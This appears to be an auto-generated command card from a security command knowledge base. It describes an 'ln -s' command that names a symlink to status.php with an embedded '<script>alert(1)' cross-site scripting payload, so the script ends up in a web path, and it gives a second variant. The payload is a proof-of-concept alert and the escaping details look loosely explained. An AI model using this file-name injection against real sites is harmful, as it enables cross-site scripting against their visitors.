---
data: ln -s ../status.php heh\\<script>alert(1)/
tags:
  - setup
  - xss
  - symlink
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.777Z'
id: c257216d-f3c6-45c3-8226-be8f35766825
verified: false
validated: true
submitted: true
---
# ln-status-php-symlink

## Command

```bash
ln -s ../status.php heh\\<script>alert(1)/
```

## Description

Creates a symbolic link to status.php in a target path with escaped XSS payload, ensuring the URL path includes the script tag for storage and execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Symbolic link flag | Yes |
| `../status.php` | Source file | Yes |
| `heh\\<script>alert(1)/` | Target path with escaped < | Yes |

## Examples

### Basic Usage

```bash
ln -s ../status.php heh\\<script>alert(1)/
```

### Advanced Usage

```bash
ln -s /full/path/status.php 'dir\\<script>alert(2)</script>/target'
```

## Expected Output

ln: creating symbolic link `heh<script>alert(1)/' -> `../status.php' (or similar success message).

## Related

- [[Related Procedure]]
